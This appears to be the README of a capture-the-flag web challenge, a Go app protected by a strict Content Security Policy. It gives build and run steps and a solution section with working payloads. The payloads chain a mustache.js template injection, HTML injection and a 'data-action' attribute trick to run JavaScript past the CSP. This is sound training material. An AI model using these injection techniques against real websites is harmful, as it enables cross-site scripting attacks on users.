# SANTAS NAUGHTY LIST

SANTAS NAUGHTY LIST is using a strict Content Security Policy to protected against all(?) XSS attacks.

## Description

Everybody is affected by COVID-19, even Santa! He can not handing out gifts due to the massive lockdown. If he cannot to find a bypass, nobody will get presents this year.

## Build with Docker

```bash
docker-compose build
```

## Run with Docker

Add flag to the [``docker-compose.yml``](./docker-compose.yml).

```bash
docker-compose up --build
```

The web server is exposed on TCP port 26. You can change it in the ``docker-compose.yml`` file.

## Build without Docker

First install [go](https://golang.org/). Next you have to install the go dependencies:

```bash
go get
```

The project is using [Go Modules](https://github.com/golang/go/wiki/Modules).

```bash
# Linux AMD64 portable
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build
```

## Usage without Docker

Start server:
```bash
./santas-naughty-list
```

## Solution

If you solved one step, the app will detect it and print a message.

1. Step: Find mustache.js template injection:
```
    http://localhost:8080/default.aspx?naughty={%22test%22:%22\%22%3E%22}&lang={{name}}
```

2. Step: Inject HTML:
```
naughty={"test":"\"><h1>HTML Injeciton</h1>"}
lang={{{people.test}}}

http://localhost:8080/default.aspx?naughty={%22test%22:%22\%22%3E%3Ch1%3EHTML%20Injeciton%3C/h1%3E%22}&lang={{{people.test}}}
```
3. Step: Execute abritary JavaScript via ``data-action`` attribute:
```
naughty={"test":"\"><a href=x data-action='{\"method\":\"alert\",\"parameters\":[\"hello\"]}'>HTML Injection</a>"}
lang={{{people.test}}}

http://localhost:8080/default.aspx?naughty={%22test%22:%22\%22%3E%3Ca%20href=x%20data-action=%27{\%22method\%22:\%22alert\%22,\%22parameters\%22:[\%22hello\%22]}%27%3EHTML%20Injection%3C/a%3E%22}&lang={{{people.test}}}
```
The flag will be disclosed if you successfully injected JavaScript.